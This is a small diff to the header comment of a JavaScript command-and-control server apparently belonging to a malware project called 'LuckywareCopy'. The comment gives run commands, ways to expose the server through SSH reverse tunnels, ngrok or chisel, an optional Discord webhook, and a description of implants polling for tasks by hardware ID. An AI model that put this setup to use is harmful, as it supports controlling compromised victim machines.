@@ -1,4 +1,4 @@
-/* LuckywareCopy C2 - no website needed.
+/* LuckywareCopy C2 - no website needed
  * Run: node src/c2.js --port 8080 [--webhook https://discord.com/api/webhooks/...]
  * Portforward: ssh -R 8080:localhost:8080 user@host  OR  ngrok http 8080  OR  chisel
  * Implant polls GET /tasks?hwid=...  operator adds tasks via CLI or POST /admin/task
